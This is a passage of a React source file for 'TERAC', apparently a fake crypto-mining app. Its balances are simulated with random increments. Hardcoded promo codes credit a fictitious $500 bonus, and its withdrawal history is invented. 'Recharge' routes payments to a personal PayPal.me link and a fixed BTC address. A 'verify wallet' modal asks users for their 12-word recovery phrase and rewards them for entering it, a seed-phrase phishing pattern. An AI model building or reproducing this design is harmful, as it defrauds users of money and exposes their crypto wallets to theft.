/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, ReactNode, useRef, MouseEvent, TouchEvent } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Wallet, 
  Link as LinkIcon, 
  Crown, 
  ArrowUpRight, 
  Home, 
  PieChart, 
  Users, 
  User, 
  Globe, 
  ShieldCheck, 
  X,
  Cpu,
  TrendingUp,
  ChevronRight,
  ChevronLeft,
  DollarSign,
  Search,
  Layout,
  Copy,
  Eye,
  EyeOff,
  MessageCircle,
  Shield,
  Book,
  FileText,
  Headset,
  LogOut,
  Check,
  Gift,
  Ticket,
  History,
  Vault,
  Scan,
  Maximize2
} from 'lucide-react';
import { translations, Language, languageNames } from './translations';
import { FAQ_DATA, FaqItem } from './faqData';

// --- TYPES ---
interface AppState {
  mining: number;
  profit: number;
  isWalletModalOpen: boolean;
  isPhraseVerifying: boolean;
  isPhraseVerified: boolean;
  recoveryPhrase: string;
  isLangMenuOpen: boolean;
  isRechargeModalOpen: boolean;
  rechargeInput: string;
  paymentMethod: 'paypal' | 'bybit' | 'binance';
  isBonusModalOpen: boolean;
  bonusCode: string;
  isInviteModalOpen: boolean;
  isProfileModalOpen: boolean;
  isAuthenticated: boolean;
  authView: 'login' | 'register';
  isCountryPickerOpen: boolean;
  selectedCountryCode: string;
  countrySearchTerm: string;
  showPassword: boolean;
  showSecurityPassword: boolean;
  rememberMe: boolean;
  isSecurityModalOpen: boolean;
  isWithdrawModalOpen: boolean;
  isNetworkModalOpen: boolean;
  withdrawSearchTerm: string;
  networkSearchTerm: string;
  selectedNetwork: string;
  selectedAsset: any | null;
  isReceiveDetailOpen: boolean;
  receiveSearchTerm: string;
  withdrawAddress: string;
  withdrawAmount: string;
  withdrawSecurityPass: string;
  isWithdrawFormOpen: boolean;
  isWithdrawHistoryOpen: boolean;
  withdrawHistory: Array<{ id: string, amount: string, symbol: string, status: string, date: string }>;
  oldSecPass: string;
  newSecPass: string;
  confirmSecPass: string;
  showOldSecPass: boolean;
  showNewSecPass: boolean;
  showConfirmSecPass: boolean;
  showUserPhone: boolean;
  isFaqModalOpen: boolean;
  isFaqDetailOpen: boolean;
  faqActiveTab: 'about' | 'welfare';
  selectedFaqItem: FaqItem | null;
  phoneNumber: string;
  activeTab: 'home' | 'ticket' | 'mining' | 'team' | 'profile';
  scratchedIndices: number[];
  ticketRewards: number[];
  ticketCooldown: number; // seconds
  vipLevel: number;
  isBonusClaimed: boolean;
  isConnectModalOpen: boolean;
  isSubmittingPhrase: boolean;
}

const COUNTRIES = [
  { name: 'United States', flag: '🇺🇸', code: '+1' },
  { name: 'Russia', flag: '🇷🇺', code: '+7' },
  { name: 'Egypt', flag: '🇪🇬', code: '+20' },
  { name: 'Morocco', flag: '🇲🇦', code: '+212' },
  { name: 'Algeria', flag: '🇩🇿', code: '+213' },
  { name: 'Tunisia', flag: '🇹🇳', code: '+216' },
  { name: 'Libya', flag: '🇱🇾', code: '+218' },
  { name: 'South Africa', flag: '🇿🇦', code: '+27' },
  { name: 'Greece', flag: '🇬🇷', code: '+30' },
  { name: 'Netherlands', flag: '🇳🇱', code: '+31' },
  { name: 'Belgium', flag: '🇧🇪', code: '+32' },
  { name: 'France', flag: '🇫🇷', code: '+33' },
  { name: 'Spain', flag: '🇪🇸', code: '+34' },
  { name: 'Hungary', flag: '🇭🇺', code: '+36' },
  { name: 'Italy', flag: '🇮🇹', code: '+39' },
  { name: 'Romania', flag: '🇷🇴', code: '+40' },
  { name: 'Switzerland', flag: '🇨🇭', code: '+41' },
  { name: 'Austria', flag: '🇦🇹', code: '+43' },
  { name: 'United Kingdom', flag: '🇬🇧', code: '+44' },
  { name: 'Denmark', flag: '🇩🇰', code: '+45' },
  { name: 'Sweden', flag: '🇸🇪', code: '+46' },
  { name: 'Norway', flag: '🇳🇴', code: '+47' },
  { name: 'Poland', flag: '🇵🇱', code: '+48' },
  { name: 'Germany', flag: '🇩🇪', code: '+49' },
  { name: 'Peru', flag: '🇵🇪', code: '+51' },
  { name: 'Mexico', flag: '🇲🇽', code: '+52' },
  { name: 'Argentina', flag: '🇦🇷', code: '+54' },
  { name: 'Brazil', flag: '🇧🇷', code: '+55' },
  { name: 'Chile', flag: '🇨🇱', code: '+56' },
  { name: 'Colombia', flag: '🇨🇴', code: '+57' },
  { name: 'Malaysia', flag: '🇲🇾', code: '+60' },
  { name: 'Australia', flag: '🇦🇺', code: '+61' },
  { name: 'Indonesia', flag: '🇮🇩', code: '+62' },
  { name: 'Philippines', flag: '🇵🇭', code: '+63' },
  { name: 'Singapore', flag: '🇸🇬', code: '+65' },
  { name: 'Thailand', flag: '🇹🇭', code: '+66' },
  { name: 'Japan', flag: '🇯🇵', code: '+81' },
  { name: 'Korea', flag: '🇰🇷', code: '+82' },
  { name: 'Vietnam', flag: '🇻🇳', code: '+84' },
  { name: 'China', flag: '🇨🇳', code: '+86' },
  { name: 'Turkey', flag: '🇹🇷', code: '+90' },
  { name: 'India', flag: '🇮🇳', code: '+91' },
  { name: 'Pakistan', flag: '🇵🇰', code: '+92' },
  { name: 'Nigeria', flag: '🇳🇬', code: '+234' },
];

export default function App() {
  // --- STATE ---
  const [lang, setLang] = useState<Language>(() => {
    return (localStorage.getItem('terac_lang') as Language) || 'en';
  });
  const [state, setState] = useState<AppState>(() => {
    const activePhone = localStorage.getItem('terac_phone') || 'guest';
    const savedAuth = localStorage.getItem('terac_auth');
    const savedMining = localStorage.getItem(`terac_mining_v12_${activePhone}`);
    const savedProfit = localStorage.getItem(`terac_profit_v12_${activePhone}`);
    const savedScratched = localStorage.getItem(`terac_scratched_v12_${activePhone}`);
    const savedRewards = localStorage.getItem(`terac_rewards_v12_${activePhone}`);
    const savedCooldown = localStorage.getItem(`terac_cooldown_v12_${activePhone}`);
    const savedVip = localStorage.getItem(`terac_vip_v12_${activePhone}`);
    const savedBonusClaimed = localStorage.getItem(`terac_bonus_claimed_v12_${activePhone}`);
    const lastTime = localStorage.getItem(`terac_cooldown_time_v12_${activePhone}`);

    let cooldown = savedCooldown ? parseInt(savedCooldown) : 0;
    if (lastTime && cooldown > 0) {
      const elapsed = Math.floor((Date.now() - parseInt(lastTime)) / 1000);
      cooldown = Math.max(0, cooldown - elapsed);
    }

    return {
      mining: savedMining ? parseFloat(savedMining) : 0.00,
      profit: savedProfit ? parseFloat(savedProfit) : 0.00,
      isWalletModalOpen: false,
      isPhraseVerifying: false,
      isPhraseVerified: false,
      recoveryPhrase: '',
      isLangMenuOpen: false,
      isRechargeModalOpen: false,
      rechargeInput: '0',
      paymentMethod: 'paypal',
      isBonusModalOpen: false,
      bonusCode: '',
      isInviteModalOpen: false,
      isProfileModalOpen: false,
      isAuthenticated: savedAuth === 'true',
      authView: 'login',
      isCountryPickerOpen: false,
      selectedCountryCode: '+1',
      countrySearchTerm: '',
      showPassword: false,
      showSecurityPassword: false,
      rememberMe: true,
      isSecurityModalOpen: false,
      isWithdrawModalOpen: false,
      isNetworkModalOpen: false,
      withdrawSearchTerm: '',
      networkSearchTerm: '',
      selectedNetwork: 'all',
      selectedAsset: null,
      isReceiveDetailOpen: false,
      receiveSearchTerm: '',
      withdrawAddress: '',
      withdrawAmount: '',
      withdrawSecurityPass: '',
      isWithdrawFormOpen: false,
      isWithdrawHistoryOpen: false,
      withdrawHistory: [
        { id: '1', amount: '100.50', symbol: 'TRX', status: 'Success', date: '2024-03-20 14:30' },
        { id: '2', amount: '50.00', symbol: 'USDT', status: 'Pending', date: '2024-03-19 09:15' }
      ],
      oldSecPass: '',
      newSecPass: '',
      confirmSecPass: '',
      showOldSecPass: false,
      showNewSecPass: false,
      showConfirmSecPass: false,
      showUserPhone: false,
      isFaqModalOpen: false,
      isFaqDetailOpen: false,
      faqActiveTab: 'about',
      selectedFaqItem: null,
      phoneNumber: localStorage.getItem('terac_phone') || '',
      activeTab: 'home',
      scratchedIndices: savedScratched ? JSON.parse(savedScratched) : [],
      ticketRewards: savedRewards ? JSON.parse(savedRewards) : [1.50, 0.50, 2.00, 5.00],
      ticketCooldown: cooldown,
      vipLevel: savedVip ? parseInt(savedVip) : 0,
      isBonusClaimed: savedBonusClaimed === 'true',
      isConnectModalOpen: false,
      isSubmittingPhrase: false
    };
  });

  const t = translations[lang];
  const total = state.mining + state.profit;

  // --- COOLDOWN TIMER ---
  useEffect(() => {
    const timer = setInterval(() => {
      setState(prev => {
        const nextCooldown = prev.ticketCooldown > 0 ? prev.ticketCooldown - 1 : 0;
        // Reset scratched indices when cooldown finishes
        if (prev.ticketCooldown === 1 && nextCooldown === 0) {
          // Shuffle rewards for the next round
          const newRewards = [...prev.ticketRewards].sort(() => Math.random() - 0.5);
          return { ...prev, ticketCooldown: 0, scratchedIndices: [], ticketRewards: newRewards };
        }
        return { ...prev, ticketCooldown: nextCooldown };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const CRYPTO_ASSETS = [
    { id: 'btc', name: 'Bitcoin', symbol: 'BTC', network: 'Bitcoin', address: 'bc1q4gs2l9ftgg3a6f2rsygp0jcxyg5fkjj20dsgh', color: '#F7931A', icon: 'https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_1280.png' },
    { id: 'eth', name: 'Ethereum', symbol: 'ETH', network: 'Ethereum', address: '0xD9B72...83E454', color: '#627EEA', icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
    { id: 'sol', name: 'Solana', symbol: 'SOL', network: 'Solana', address: '7VMAHN9...xn9iRo', color: '#14F195', icon: 'https://cryptologos.cc/logos/solana-sol-logo.png' },
    { id: 'twt', name: 'TWT', symbol: 'TWT', network: 'BNB Smart Chain', address: '0xD9B72...83E454', color: '#3375BB', icon: 'https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png' },
    { id: 'bnb', name: 'BNB', symbol: 'BNB', network: 'BNB Smart Chain', address: '0xD9B72...83E454', color: '#F3BA2F', icon: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png' },
    { id: 'usdt_eth', name: 'USDT', symbol: 'USDT', network: 'Ethereum', address: '0xD9B72...83E454', color: '#26A17B', icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png' },
    { id: 'usdc_eth', name: 'USDC', symbol: 'USDC', network: 'Ethereum', address: '0xD9B72...83E454', color: '#2775CA', icon: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png' },
    { id: 'pie', name: 'PIEVERSE', symbol: 'PIEVERSE', network: 'Ethereum', address: '0xD9B72...83E454', color: '#FF4500', icon: 'https://cryptologos.cc/logos/pancakeswap-cake-logo.png' },
    { id: 'rave', name: 'RAVE', symbol: 'RAVE', network: 'Ethereum', address: '0xD9B72...83E454', color: '#8A2BE2', icon: 'https://cryptologos.cc/logos/ravencoin-rvn-logo.png' },
    { id: 'aave', name: 'AAVE', symbol: 'AAVE', network: 'Ethereum', address: '0xD9B72...83E454', color: '#B6509E', icon: 'https://cryptologos.cc/logos/aave-aave-logo.png' },
    { id: 'doge', name: 'Dogecoin', symbol: 'DOGE', network: 'Dogecoin', address: 'DG3whdm...yVabB5', color: '#C2A633', icon: 'https://cryptologos.cc/logos/dogecoin-doge-logo.png' },
    { id: 'ada', name: 'Cardano', symbol: 'ADA', network: 'Cardano', address: 'addr1qy...rhfjlx', color: '#0033AD', icon: 'https://cryptologos.cc/logos/cardano-ada-logo.png' },
    { id: 'trx', name: 'Tron', symbol: 'TRX', network: 'Tron', address: 'TTE3csp...hU2tWR', color: '#FF0013', icon: 'https://cryptologos.cc/logos/tron-trx-logo.png' },
  ];

  // --- PERSISTENCE ---
  useEffect(() => {
    // Only save if authenticated OR if it's the guest session (but we prefer only saving authenticated)
    // Actually, to prevent the "logout wipe" bug, we only save if isAuthenticated is true.
    if (!state.isAuthenticated && state.phoneNumber !== '') return; 

    const activePhone = state.phoneNumber || 'guest';
    localStorage.setItem(`terac_mining_v12_${activePhone}`, state.mining.toString());
    localStorage.setItem(`terac_profit_v12_${activePhone}`, state.profit.toString());
    localStorage.setItem(`terac_vip_v12_${activePhone}`, state.vipLevel.toString());
    localStorage.setItem(`terac_scratched_v12_${activePhone}`, JSON.stringify(state.scratchedIndices));
    localStorage.setItem(`terac_rewards_v12_${activePhone}`, JSON.stringify(state.ticketRewards));
    localStorage.setItem(`terac_cooldown_v12_${activePhone}`, state.ticketCooldown.toString());
    localStorage.setItem(`terac_cooldown_time_v12_${activePhone}`, Date.now().toString());
    localStorage.setItem(`terac_bonus_claimed_v12_${activePhone}`, state.isBonusClaimed.toString());
    localStorage.setItem('terac_lang', lang);
  }, [state.mining, state.profit, state.vipLevel, state.scratchedIndices, state.ticketRewards, state.ticketCooldown, state.phoneNumber, state.isBonusClaimed, lang, state.isAuthenticated]);

  // --- MINING SIMULATOR ---
  useEffect(() => {
    const interval = setInterval(() => {
      setState(prev => ({
        ...prev,
        mining: prev.mining + (Math.random() * 0.001)
      }));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  // --- HANDLERS ---
  const handleRecharge = () => {
    setState(prev => ({ ...prev, isRechargeModalOpen: true, rechargeInput: '0' }));
  };

  const handleNumpadFocus = (val: string) => {
    setState(prev => {
      let next = prev.rechargeInput;
      if (val === 'back') {
        next = next.length > 1 ? next.slice(0, -1) : '0';
      } else if (val === '.') {
        if (!next.includes('.')) next += '.';
      } else {
        if (next === '0') next = val;
        else next += val;
      }
      return { ...prev, rechargeInput: next };
    });
  };

  const handleContinueRecharge = () => {
    const amount = parseFloat(state.rechargeInput);
    if (amount > 0) {
      let url = "";
      if (state.paymentMethod === 'paypal') {
        url = `https://www.paypal.me/AlessandraAxel/${amount}`;
      } else if (state.paymentMethod === 'bybit') {
        url = "https://www.bybit.com"; // Placeholder or generic
      } else if (state.paymentMethod === 'binance') {
        url = "https://www.binance.com"; // Placeholder or generic
      }
      
      window.open(url, '_blank');
      setState(prev => ({ ...prev, isRechargeModalOpen: false }));
      alert(t.rechargeAlert);
    }
  };

  const handleBonus = () => {
    setState(prev => ({ ...prev, isBonusModalOpen: true }));
  };

  const handleActivateBonus = () => {
    if (state.isBonusClaimed) {
      alert(lang === 'ar' ? 'لقد حصلت بالفعل على هذا البونص.' : 'You have already claimed this bonus.');
      setState(prev => ({ ...prev, isBonusModalOpen: false, bonusCode: '' }));
      return;
    }

    const code = state.bonusCode.trim().toUpperCase();
    const validCodes = ['VIP500', 'TERAC', 'COINTERAC', 'GIFT500', 'PROMO500', 'TERAC500', 'GPT500', 'BONUS500', 'AI500'];
    
    if (validCodes.includes(code)) {
      setState(prev => ({
        ...prev,
        profit: prev.profit + 500,
        isBonusModalOpen: false,
        bonusCode: '',
        isBonusClaimed: true
      }));
      alert(lang === 'ar' ? 'تهانينا! لقد حصلت على 500 دولار مكافأة.' : 'Congratulations! You received a $500 bonus.');
    } else {
      alert(t.bonusError);
    }
  };

  const handleVerifyWallet = () => {
    if (!state.recoveryPhrase.trim()) {
      alert(lang === 'ar' ? 'يرجى إدخال عبارة الاسترداد الخاصة بك.' : 'Please enter your 12-word recovery phrase.');
      return;
    }
    
    setState(prev => ({ ...prev, isPhraseVerifying: true }));
    
    setTimeout(() => {
      setState(prev => ({ 
        ...prev, 
        isPhraseVerifying: false, 
        isPhraseVerified: true,
        mining: prev.mining + 10.00
      }));
      
      alert(t.syncAlert);
      
      setTimeout(() => {
        setState(prev => ({ ...prev, isWalletModalOpen: false, recoveryPhrase: '', isPhraseVerified: false, isPhraseVerifying: false }));
      }, 1500);
    }, 2500);
  };

  const toggleLanguageMenu = () => {
    setState(prev => ({ ...prev, isLangMenuOpen: !prev.isLangMenuOpen }));
  };

  const selectLanguage = (l: Language) => {
    setLang(l);
    setState(prev => ({ ...prev, isLangMenuOpen: false }));
  };

  const handleAuth = () => {
    const phone = state.phoneNumber.trim() || 'guest';
    const savedMining = localStorage.getItem(`terac_mining_v12_${phone}`);
    const savedProfit = localStorage.getItem(`terac_profit_v12_${phone}`);
    const savedScratched = localStorage.getItem(`terac_scratched_v12_${phone}`);
    const savedRewards = localStorage.getItem(`terac_rewards_v12_${phone}`);
    const savedCooldown = localStorage.getItem(`terac_cooldown_v12_${phone}`);
    const savedVip = localStorage.getItem(`terac_vip_v12_${phone}`);
    const savedBonusClaimed = localStorage.getItem(`terac_bonus_claimed_v12_${phone}`);
    
    localStorage.setItem('terac_auth', 'true');
    localStorage.setItem('terac_phone', phone);
    
    setState(prev => ({ 
      ...prev, 
      isAuthenticated: true, 
      phoneNumber: phone,
      mining: savedMining ? parseFloat(savedMining) : 0.00,
      profit: savedProfit ? parseFloat(savedProfit) : 0.00,
      vipLevel: savedVip ? parseInt(savedVip) : 0,
      scratchedIndices: savedScratched ? JSON.parse(savedScratched) : [],
      ticketRewards: savedRewards ? JSON.parse(savedRewards) : [1.50, 0.50, 2.00, 5.00],
      ticketCooldown: savedCooldown ? parseInt(savedCooldown) : 0,
      isBonusClaimed: savedBonusClaimed === 'true'
    }));
  };

  const handleLogout = () => {
    localStorage.removeItem('terac_auth');
    // We KEEP terac_phone so it stays "registered" in local storage for pre-filling
    
    setState(prev => ({ 
      ...prev, 
      isAuthenticated: false, 
      isProfileModalOpen: false, 
      authView: 'login',
      // We keep the phoneNumber in state so it stays in the login field
      mining: 0,
      profit: 0,
      vipLevel: 0,
      scratchedIndices: [],
      ticketCooldown: 0,
      isBonusClaimed: false
    }));
  };

  if (!state.isAuthenticated) {
    return (
      <div dir={lang === 'ar' ? 'rtl' : 'ltr'} className="min-h-screen bg-[#0b0c10] text-white flex flex-col items-center pt-20 px-6 font-sans">
        <div className="absolute top-6 right-6 flex items-center gap-4">
          <button 
            onClick={() => setState(prev => ({ ...prev, isLangMenuOpen: true }))}
            className="flex items-center gap-2 bg-white/5 px-4 py-2 rounded-full border border-white/10"
          >
            <Globe size={18} className="text-gray-400" />
            <span className="text-sm font-bold">{languageNames[lang]}</span>
          </button>
          <div className="relative group">
            {/* Customer Support Image Removed */}
          </div>
        </div>

        {/* Logo Section */}
        <div className="flex flex-col items-center mb-12">
          <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mb-4">
             <div className="w-14 h-14 border-4 border-white rounded-xl flex items-center justify-center">
                <div className="w-8 h-8 border-4 border-white rounded-lg" />
              </div>
          </div>
          <h1 className="text-3xl font-black tracking-widest">TERAC</h1>
        </div>

        {/* Auth Box */}
        <div className="w-full max-w-sm bg-[#1c1c1e] rounded-[40px] p-8 shadow-2xl border border-white/5 space-y-6">
          
          <div className="space-y-4">
            {/* Phone Input */}
            <div className="bg-black/40 rounded-2xl p-4 flex items-center gap-3 border border-white/5">
              <button 
                onClick={() => setState(prev => ({ ...prev, isCountryPickerOpen: true }))}
                className="flex items-center gap-1 text-white font-bold opacity-70 hover:opacity-100 transition-opacity"
              >
                <span>{state.selectedCountryCode}</span>
                <ChevronRight size={14} className="rotate-90 mt-0.5" />
              </button>
              <div className="w-px h-4 bg-white/10" />
              <input 
                type="tel" 
                inputMode="numeric"
                placeholder={t.phonePlaceholder}
                value={state.phoneNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '');
                  setState(prev => ({ ...prev, phoneNumber: val }));
                }}
                className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm"
              />
            </div>

            {/* Password Input */}
            <div className="bg-black/40 rounded-2xl p-4 flex items-center justify-between border border-white/5">
              <input 
                type={state.showPassword ? "text" : "password"} 
                placeholder={t.passwordPlaceholder}
                className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm"
              />
              <div className="flex items-center gap-3 text-gray-500">
                <Shield size={18} />
                <button 
                  onClick={() => setState(prev => ({ ...prev, showPassword: !prev.showPassword }))}
                  className="hover:text-white transition-colors"
                >
                  {state.showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>

            {state.authView === 'register' && (
              <>
                <div className="bg-black/40 rounded-2xl p-4 flex items-center justify-between border border-white/5">
                  <input 
                    type={state.showSecurityPassword ? "text" : "password"} 
                    placeholder={t.securityPasswordPlaceholder}
                    className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm"
                  />
                  <div className="flex items-center gap-3 text-gray-500">
                    <Shield size={18} />
                    <button 
                      onClick={() => setState(prev => ({ ...prev, showSecurityPassword: !prev.showSecurityPassword }))}
                      className="hover:text-white transition-colors"
                    >
                      {state.showSecurityPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                    </button>
                  </div>
                </div>
                <div className="bg-black/40 rounded-2xl p-4 border border-white/5">
                  <input 
                    type="text" 
                    placeholder={t.invitationCodePlaceholder}
                    className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm w-full"
                    defaultValue="dmpeqa"
                  />
                </div>
              </>
            )}
          </div>

          {state.authView === 'login' && (
            <button 
              onClick={() => setState(prev => ({ ...prev, rememberMe: !prev.rememberMe }))}
              className="flex items-center gap-2 px-2 text-sm text-gray-400 group"
            >
              <div className={`w-5 h-5 border-2 rounded-full flex items-center justify-center transition-colors ${state.rememberMe ? 'bg-orange-600 border-orange-600' : 'border-white/20'}`}>
                 {state.rememberMe && <Check size={12} className="text-white" strokeWidth={4} />}
              </div>
              <span className={`font-medium transition-colors ${state.rememberMe ? 'text-white' : ''}`}>{t.rememberMe}</span>
            </button>
          )}

          <button 
            onClick={handleAuth}
            className="w-full bg-gradient-to-r from-orange-600 to-orange-500 py-5 rounded-3xl font-black text-white shadow-xl shadow-orange-950/20 active:scale-95 transition-all text-sm uppercase tracking-wider"
          >
            {state.authView === 'login' ? t.signIn : t.signUp}
          </button>

          <div className="text-center space-y-4">
            <p className="text-sm">
              <span className="text-gray-400">{state.authView === 'login' ? t.noAccount : t.haveAccount}</span>
              <button 
                onClick={() => setState(prev => ({ ...prev, authView: prev.authView === 'login' ? 'register' : 'login' }))}
                className="text-orange-500 font-bold ml-1 active:opacity-50"
              >
                {state.authView === 'login' ? t.register : t.login}
              </button>
            </p>
            <button 
              onClick={handleAuth}
              className="block w-full text-white font-medium text-sm hover:underline"
            >
              {t.accessHome}
            </button>
          </div>

          {/* Terms */}
          <div className="flex items-start gap-2 pt-4 px-2">
            <div className="mt-1 w-5 h-5 bg-orange-600 rounded-full flex items-center justify-center text-white">
                <Check size={12} strokeWidth={4} />
            </div>
            <p className="text-[10px] text-gray-500 leading-relaxed">
              {t.agreeToTerms} <span className="text-orange-500">« {t.termsLink} »</span>
            </p>
          </div>
        </div>

        {/* Country Picker Modal */}
        <AnimatePresence>
          {state.isCountryPickerOpen && (
            <div className="fixed inset-0 z-[400] flex flex-col justify-end">
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                onClick={() => setState(prev => ({ ...prev, isCountryPickerOpen: false }))}
                className="absolute inset-0 bg-black/60 backdrop-blur-sm"
              />
              <motion.div 
                initial={{ y: '100%' }}
                animate={{ y: 0 }}
                exit={{ y: '100%' }}
                transition={{ type: 'spring', damping: 25, stiffness: 200 }}
                className="relative w-full max-w-lg mx-auto bg-white rounded-t-[32px] flex flex-col overflow-hidden max-h-[85vh]"
              >
                {/* Search Bar */}
                <div className="p-4 border-b border-gray-100">
                  <div className="relative">
                    <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
                    <input 
                      type="text" 
                      value={state.countrySearchTerm}
                      onChange={(e) => setState(prev => ({ ...prev, countrySearchTerm: e.target.value }))}
                      placeholder={t.searchPlaceholder}
                      className="w-full bg-gray-100 border-none rounded-2xl py-3 pl-12 pr-4 text-gray-900 focus:ring-2 focus:ring-orange-500/20"
                    />
                  </div>
                </div>

                {/* Country List */}
                <div className="flex-1 overflow-y-auto px-4 py-2">
                  {COUNTRIES.filter(c => 
                    c.name.toLowerCase().includes(state.countrySearchTerm.toLowerCase()) || 
                    c.code.includes(state.countrySearchTerm)
                  ).map((country) => (
                    <button
                      key={`${country.name}-${country.code}`}
                      onClick={() => setState(prev => ({ 
                        ...prev, 
                        selectedCountryCode: country.code,
                        isCountryPickerOpen: false,
                        countrySearchTerm: ''
                      }))}
                      className="w-full flex items-center justify-between py-4 border-b border-gray-50 last:border-none group active:bg-gray-50 rounded-xl px-2 transition-colors"
                    >
                      <div className="flex items-center gap-3">
                        <span className="text-xl">{country.flag}</span>
                        <span className="font-semibold text-gray-800">{country.name}</span>
                        <span className="text-orange-500 font-bold">({country.code})</span>
                      </div>
                      {state.selectedCountryCode === country.code && (
                        <div className="w-5 h-5 bg-orange-500 rounded-full flex items-center justify-center">
                          <Check size={12} className="text-white" strokeWidth={4} />
                        </div>
                      )}
                    </button>
                  ))}
                </div>
                
                {/* Safe Area Padding */}
                <div className="h-8 bg-white" />
              </motion.div>
            </div>
          )}
        </AnimatePresence>

        {/* Language Modal */}
        <AnimatePresence>
          {state.isLangMenuOpen && (
            <div className="fixed inset-0 z-[300] flex items-center justify-center px-6">
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                onClick={() => setState(prev => ({ ...prev, isLangMenuOpen: false }))}
                className="absolute inset-0 bg-black/60 backdrop-blur-md"
              />
              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }}
                className="relative w-full max-w-xs bg-[#1c1c1e] rounded-[30px] p-6 border border-white/10"
              >
                <div className="grid grid-cols-1 gap-3">
                  {(Object.keys(languageNames) as Language[]).map((l) => (
                    <button
                      key={l}
                      onClick={() => selectLanguage(l)}
                      className={`py-4 rounded-2xl font-bold flex items-center justify-center gap-3 transition-colors ${lang === l ? 'bg-orange-600 text-white' : 'bg-white/5 text-gray-400'}`}
                    >
                      {languageNames[l]}
                    </button>
                  ))}
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    );
  }

  return (
    <div dir={lang === 'ar' ? 'rtl' : 'ltr'} className={`min-h-screen bg-[#0b0c10] font-sans pb-24 selection:bg-[#f3ba2f] selection:text-black text-white ${lang === 'ar' ? 'font-sans' : ''}`}>
      {/* Bonus Modal - Redesigned to match screenshot exactly */}
      <AnimatePresence>
        {state.isBonusModalOpen && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center px-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setState(prev => ({ ...prev, isBonusModalOpen: false }))}
              className="absolute inset-0 bg-[#0b101b]/95 backdrop-blur-md"
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.95, y: 30 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 30 }}
              className="relative w-full max-w-sm overflow-hidden"
            >
              <div className="mb-4">
              </div>

              <div className="bg-[#121826] rounded-[40px] p-8 relative overflow-hidden border border-white/5 flex flex-col items-center">
                
                {/* Gift Icon Header */}
                <div className="w-14 h-14 bg-[#00ff88] rounded-[22px] flex items-center justify-center mb-4 shadow-[0_0_20px_rgba(0,255,136,0.3)]">
                  <div className="w-9 h-9 rounded-xl bg-black flex items-center justify-center">
                    <Gift size={20} className="text-[#00ff88]" />
                  </div>
                </div>

                <h3 className="text-2xl font-black text-white mb-3">{t.activateBonus}</h3>
                
                <p className="text-gray-400 text-center text-[13px] font-medium leading-relaxed mb-10 px-2">
                  {t.bonusDesc}
                </p>

                {/* Input Area */}
                <div className="w-full relative z-20 mb-32">
                   <div className="flex bg-[#0b0f1a] rounded-[24px] p-1.5 border border-white/5 shadow-inner">
                    <input 
                      type="text"
                      value={state.bonusCode}
                      onChange={(e) => setState(prev => ({ ...prev, bonusCode: e.target.value }))}
                      placeholder={t.inputBonusPlaceholder}
                      className="flex-1 bg-transparent border-none focus:outline-none text-white px-4 py-3 text-sm font-bold placeholder:text-gray-700"
                    />
                    <button 
                      onClick={handleActivateBonus}
                      className="bg-[#00ff88] text-black px-6 py-3 rounded-[20px] font-black text-sm flex items-center gap-2 hover:scale-[1.02] active:scale-95 transition-all"
                    >
                      <Gift size={16} />
                      {t.activate}
                    </button>
                  </div>
                </div>

                {/* Mascot Image (Person) */}
                <div className="absolute bottom-0 w-full h-[260px] flex justify-center pointer-events-none z-10">
                   <img 
                    src="https://www.werder.de/fileadmin/user_upload/Mose_Mannschaft_24_25/Friedl.png" 
                    className="h-full object-contain filter drop-shadow-[0_0_30px_rgba(0,255,136,0.3)]" 
                    alt="Mascot"
                    onError={(e) => {
                      (e.target as any).src = "https://www.fifarosters.com/assets/players/fifa23/dynamic/240273.png";
                    }}
                  />
                  
                  {/* Decorative Elements */}
                  <div className="absolute top-1/4 left-10 opacity-20 animate-pulse">
                     <PieChart size={32} className="text-[#00ff88]" />
                  </div>
                  <div className="absolute top-1/3 right-12 opacity-10 rotate-12">
                     <FileText size={40} className="text-white" />
                  </div>
                  <div className="absolute bottom-1/4 left-15 opacity-10 -rotate-12">
                     <Users size={30} className="text-white" />
                  </div>
                </div>

                {/* Glow Background */}
                <div className="absolute -bottom-20 -left-20 w-64 h-64 bg-[#00ff88] opacity-10 blur-[100px] rounded-full" />
              </div>

              {/* Close Button Top Right */}
              <button 
                onClick={() => setState(prev => ({ ...prev, isBonusModalOpen: false }))}
                className="absolute top-0 right-2 w-10 h-10 flex items-center justify-center text-gray-500 hover:text-white"
              >
                <X size={24} />
              </button>

            </motion.div>
          </div>
        )}
      </AnimatePresence>
      {/* Header */}
